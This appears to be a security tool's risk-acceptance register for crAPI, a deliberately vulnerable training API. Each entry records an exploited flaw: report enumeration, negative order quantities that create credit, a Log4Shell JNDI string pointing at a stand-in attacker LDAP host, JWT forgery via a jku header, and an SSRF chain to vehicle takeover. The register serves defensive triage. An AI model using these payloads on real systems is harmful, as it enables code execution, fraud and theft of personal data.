# accepted-behaviors.yaml — a risk-acceptance register.
#
# Every entry is a behavior treated as ACCEPTED: as long as an entry exists, the
# tool considers that behavior intended and does not re-report it. To stop
# accepting one, delete it — the finding comes back. Version control records who
# changed what, and when.
#
#   consequence:  [tool] the precise risk, in plain terms a non-expert can
#                 evaluate — what could actually happen. (max 1000 runes)
#   evidence:     [tool] proof it looks intentional — comment / test / flag /
#                 code, by file:line.
#   reason:       [human] your team's rationale for accepting this — your own
#                 documentation. The tool never writes it, and an entry is
#                 accepted by being here, not by this field. But fill it in: an
#                 undocumented acceptance no one can explain later is how real
#                 risk quietly gets forgotten.
#
# Be specific enough to adjudicate in seconds. Vague entries hide real bugs.
#
# This file accumulates across runs and is APPEND-ONLY. Anyone updating it — tool
# or human — must read it first, keep every existing entry (especially the human
# `reason`), and only append; never rewrite, reorder, or drop entries. Presence
# is the suppression signal, so a clobbered entry silently un-accepts a finding.
# COMMIT it to git — that is your history, your review trail, and your undo.
#
# Create `accepted-behaviors.yaml` next to this file, carrying this header into
# it so its rules travel with the data.

accepted_behaviors:
  - consequence: "Any authenticated mechanic can read every other mechanic's
      service reports by enumerating report_id on GET
      /workshop/api/mechanic/mechanic_report, exposing all customers' PII
      (email, phone number, VIN, vehicle make/model, and problem
      description) filed under a different mechanic's caseload. Confirmed
      live: GET /workshop/api/mechanic/mechanic_report?report_id=<other
      mechanic's report> returns HTTP 200 with the other mechanic's full
      report and customer PII, from either mechanic against the other's
      report."
    evidence: "docs/challenges.md:25-33 'Challenge 2 - Access mechanic
      reports of other users' and docs/challengeSolutions.md:28-36 give a
      step-by-step walkthrough of this exact endpoint and technique
      (submit a contact-mechanic report, take report_id from the returned
      report_link, change report_id to read another user's mechanic
      report) as a deliberately built, documented BOLA challenge — not a
      generic 'intentionally vulnerable app' label but a description of
      this specific endpoint and exploit. Matches the unfiltered lookup in
      services/workshop/crapi/mechanic/views.py GetReportView.get()
      (`ServiceRequest.objects.filter(id=report_id).first()`, no mechanic
      ownership filter), which is exactly the code path the docs describe."
    reason: ""
  # TC-74FEB153 — order-quantity credit check ignores quantity (shop orders)
  - consequence: "Any authenticated user can order a large or arbitrary quantity of a shop product using only the credit for one unit, driving their account balance deeply negative and taking effectively free goods from the shop (e.g. an account with $1,000,070 credit was driven to -$999,930 by ordering 200,000 units)."
    evidence: "services/workshop/crapi/shop/views.py:195-200 (OrderControlView.post) checks only `available_credit < product.price` (a single unit) before deducting `product.price * quantity` for the full order — this is the same quantity-manipulation flaw on POST /workshop/api/shop/orders that the project's own documentation calls out as an intentional training vulnerability: docs/challenges.md 'Challenge 8 - Get an item for free' and 'Challenge 9 - Increase your balance by $1,000 or more', and docs/challengeSolutions.md, which walk through exploiting this exact endpoint's missing quantity validation on the credit check to manipulate the account balance via the `quantity` field."
    reason: ""
  # TC-7636EF03 — negative order quantity flips the credit deduction into a credit gain (shop orders)
  - consequence: "Any authenticated user can manufacture unlimited shop credit at will by submitting a negative `quantity` on POST /workshop/api/shop/orders — e.g. `{\"product_id\": 1, \"quantity\": -1}` turns a $10 order into a +$10 credit gain — and can repeat this indefinitely to reach an arbitrarily large balance, effectively stealing any item in the shop for free."
    evidence: "services/workshop/crapi/shop/serializers.py:79-85 (ProductQuantitySerializer) places no lower bound on `quantity` (no `min_value`), and services/workshop/crapi/shop/views.py:200 (OrderControlView.post) computes `user_details.available_credit -= float(product.price * request_data[\"quantity\"])`, so a negative quantity subtracts a negative number and increases credit instead. This is not a distinct bug from the sibling accepted finding above — it is the literal, word-for-word exploit the project's own docs/challengeSolutions.md walks through for the exact same endpoint: 'Challenge 8 - Get an item for free' (docs/challengeSolutions.md:59-70, step 6: 'Try to change the value of quantity in the request body to a negative value and send the request. It can be observed that the available balance has now increased and the order has been placed.') and 'Challenge 9 - Increase your balance by $1,000 or more' (docs/challengeSolutions.md:72-85, step 7: 'provide an appropriate value in the quantity (ie: -100 or less)... the available balance has now increased by $1000 or more.'). This is a deliberately built, documented training vulnerability on this specific endpoint and technique, not a generic 'intentionally vulnerable app' label."
    reason: ""
  # TC-086C6640 — Log4Shell (CVE-2021-44228) via JNDI string in login email
  - consequence: "An unauthenticated attacker who sends a JNDI lookup string (e.g. ${jndi:ldap://attacker-host:1389/}) in the login email field on POST /identity/api/auth/login causes the identity service to open an outbound LDAP connection to an attacker-controlled host; if that host serves a malicious Java class, the service executes it with its own OS-level privileges (remote code execution). Confirmed live: baseline login and a JNDI payload to a closed port both return in ~4ms, while a JNDI payload to a non-routable address stalls until curl's timeout (10s+), and crapi-identity's own logs record 'Log4j Exploit Try/Success With Email' for the payload — proving the vulnerable code path fires and the outbound connection attempt happens."
    evidence: "services/identity/src/main/java/com/crapi/service/Impl/UserServiceImpl.java:93-101,408-410 — the login path is a purpose-built exploit trigger, not an accidental vulnerable log call: it uses a second, separately-instantiated log4j-core `LOG4J_LOGGER` (distinct from the app's normal SLF4J `log`), is gated behind `isLog4jEnabled()` reading `ENABLE_LOG4J` from the environment, and logs 'Log4j Exploit Try With Email'/'Log4j Exploit Success With Email' when triggered — self-documenting as a deliberate training vulnerability, not app logic. The capability flag defaults OFF in every shipped deployment config (deploy/docker/.env:7 `ENABLE_LOG4J=false`, deploy/docker/docker-compose.yml:43 `${ENABLE_LOG4J:-false}`, services/identity/.env:13 `export ENABLE_LOG4J=false`) and is only 'true' here because niro's own harness config (niro/fixtures.yaml:41-62 'enabled_vulnerable_flags') deliberately turns it on to bring this specific, documented surface into scope for testing (confirmed live: `docker exec crapi-identity env` shows `ENABLE_LOG4J=true` only via this harness override)."
    reason: ""
  # TC-D84388F0 — JWT auth bypass via attacker-controlled jku header
  - consequence: "Any unauthenticated party who can reach the identity API can
      impersonate any registered user, including the global admin, by sending
      a JWT whose 'jku' header points to a JWKS URL they control (or, as
      demonstrated here, a self-referential URL on the server itself). The
      server fetches that URL and verifies the token's signature against the
      returned key instead of its own statically configured key, so any
      RS256-signed token with a matching kid is accepted as authentic.
      Confirmed live: a forged admin@example.com / ROLE_ADMIN token with a jku
      header returned HTTP 200 with the admin's own dashboard data from
      GET /identity/api/v2/user/dashboard, signed with the key shipped in
      deploy/docker/keys/jwks.json (used here only as a convenient key pair
      for the repro — a real attacker would host their own)."
    evidence: "services/identity/src/main/java/com/crapi/config/JwtProvider.java:130-148
      (getKeyFromJkuHeader fetches and trusts an attacker-supplied jku URL) and
      :184-191 (validateJwtToken prefers that fetched key over
      this.publicRSAKey whenever a jku header is present) implement exactly
      the behavior documented as an intended lab exercise in
      docs/challengeSolutions.md:121-126 and docs/challenges.md, 'Challenge 15
      - Find a way to forge valid JWT Tokens' / 'JKU Misuse Vulnerability':
      'crAPI will verify JWT token with any public key that is pointed to by
      the jku JWT header ... This JWT will be accepted as a valid JWT Token by
      crAPI.' The same doc section and file also document/implement two
      sibling JWT vulnerabilities (algorithm confusion at
      JwtProvider.java:150-164, KID path traversal at :157-160) with explicit
      '(vulnerability)' comments, confirming this whole class of JWT weakness
      is deliberate, not accidental, in this training application."
    reason: ""
  # TC-71463C20 — SSRF via contact_mechanic's mechanic_api chained to MailHog
  # email disclosure and vehicle takeover
  - consequence: "Any authenticated user can redirect the mechanic contact
      bridge (POST /workshop/api/merchant/contact_mechanic, mechanic_api
      field) to an arbitrary internal URL and have the raw response echoed
      back to them, including the internal MailHog store. Pointed at
      MailHog's API, this reveals every user's system emails, which contain
      each user's vehicle VIN and pincode in plain text; those values are
      accepted by POST /identity/api/v2/vehicle/add_vehicle with no further
      check, letting the attacker transfer another user's vehicle to their
      own account. Confirmed live in the finding's own PoC: fetching MailHog
      messages via the mechanic_api SSRF and replaying a victim's leaked
      VIN/pincode against add_vehicle returned 'Vehicle saved successfully!'
      for multiple victim accounts."
    evidence: "The core primitive — contact_mechanic's mechanic_api field
      accepting an arbitrary URL and returning the raw HTTP response — is a
      documented, intentional training vulnerability at this exact endpoint:
      docs/challenges.md:80-81 'SSRF / Challenge 11 - Make crAPI send an HTTP
      call to https://www.google.com and return the HTTP response' and
      docs/challengeSolutions.md:89-91 (same wording), matching
      services/workshop/crapi/merchant/views.py:84-92
      (ContactMechanicView.post: `requests.get(request_url, ...)` with
      `request_url = request_data['mechanic_api']`, no host restriction,
      response body returned to the caller at :117-128). The downstream leg —
      registering a vehicle from the VIN/pincode delivered by email — is
      itself the documented legitimate flow, not a separate bug:
      docs/challengeSolutions.md:17 'add the vehicle by providing the VIN and
      pincode received in Mailhog mailbox after Signup', implemented at
      identity's add_vehicle endpoint with no ownership binding beyond
      VIN+pincode. The finding is this same documented SSRF primitive chained
      to that same documented VIN/pincode flow via the dev-only MailHog
      instance reachable on the internal network."
    reason: ""
  # TC-28EC3264 — unauthenticated self-registration as a mechanic
  - consequence: "Any anonymous person on the internet can create a
      privileged ROLE_MECHANIC account with a chosen mechanic_code via POST
      /workshop/api/mechanic/signup — no auth, no admin approval, no
      existing account required — gaining full access to mechanic-only
      workshop endpoints (service requests, reports, comments) and the
      ability to be assigned/act on any vehicle's service request."
    evidence: "services/workshop/crapi/mechanic/views.py:54-55
      (SignUpView.post) carries no @jwt_auth_required decorator and no
      role/admin check, unlike every other mechanic endpoint in the same
      file (MechanicView.get:130, MechanicServiceRequestsView.get:256,
      ServiceCommentView.post/get:299,330 all require
      @jwt_auth_required). The app's own test suite,
      services/workshop/crapi/mechanic/tests.py, exercises and asserts
      exactly this behavior as correct: test_duplicate_email_signup
      (lines 48-68), test_duplicate_mechanic_code (70-92), and
      test_no_duplicate (94-111) each POST to
      /workshop/api/mechanic/signup with a bare django.test.Client — no
      Authorization header set anywhere in MechanicSignUpTestCase.setUp
      or the test bodies — and assert HTTP 200, i.e. the test suite
      treats unauthenticated mechanic self-registration as the intended,
      passing behavior of the endpoint rather than an oversight. This
      also mirrors the app-wide pattern of open self-service signup (the
      identity service's own user signup, /identity/api/auth/signup, is
      likewise unauthenticated by design)."
    reason: ""
  # TC-4D0466D3 — same GetReportView.get() gap also lets non-mechanics in
  # (BFLA, not just mechanic-vs-mechanic BOLA)
  - consequence: "Any authenticated user, including plain customers who hold
      no mechanic role at all (e.g. ROLE_PREDEFINE 'Adam', ROLE_USER
      'Test'), can fetch the full service report for any service request by
      enumerating report_id on GET
      /workshop/api/mechanic/mechanic_report — this endpoint is meant to be
      mechanic-only but performs no role check whatsoever, so it exposes
      the vehicle owner's email/phone/VIN, the assigned mechanic's
      identity, and free-text problem_details (often containing further
      PII) to any logged-in user, not only to other mechanics. Confirmed
      live: authenticating as adam007@example.com (ROLE_PREDEFINE, no
      mechanic flag) and calling GET
      /workshop/api/mechanic/mechanic_report?report_id=1 (owned by Adam
      himself, mechanic James), report_id=2 (owned by admin@example.com)
      and report_id=3 (owned by pogba006@example.com) all returned HTTP 200
      with the full report and owner PII; the same endpoint correctly
      returns HTTP 401 with no token or a malformed token, showing this is
      a missing authorization check on this endpoint specifically, not a
      broken/broadly-red harness."
    evidence: "services/workshop/crapi/mechanic/views.py GetReportView.get()
      (decorated only with `@jwt_auth_required`, at line ~213) performs no
      role check at all before
      `ServiceRequest.objects.filter(id=report_id).first()` — contrast with
      the sibling ServiceCommentView.post() in the same file (line ~304),
      which explicitly gates on `if user.role != User.ROLE_CHOICES.MECH`
      before touching the same ServiceRequest model, proving the codebase
      knows how to enforce mechanic-only access and simply omitted it here.
      This is the identical code path and identical documented exploit as
      the GetReportView.get() entry above (docs/challenges.md 'Challenge 2
      - Access mechanic reports of other users', docs/challengeSolutions.md
      step-by-step walkthrough): that walkthrough explicitly begins 'Login
      to the application' and 'After adding a vehicle, we will have an
      option to send service request to mechanic by using the Contact
      Mechanic option' — an ordinary vehicle-owning customer action, not a
      mechanic-only one — then walks report_id in the returned
      report_link. The documented challenge was never scoped to a mechanic
      attacker; a plain customer enumerating report_id is exactly the
      intended lab exercise, only demonstrated here against a
      non-mechanic's own token rather than a second mechanic's."
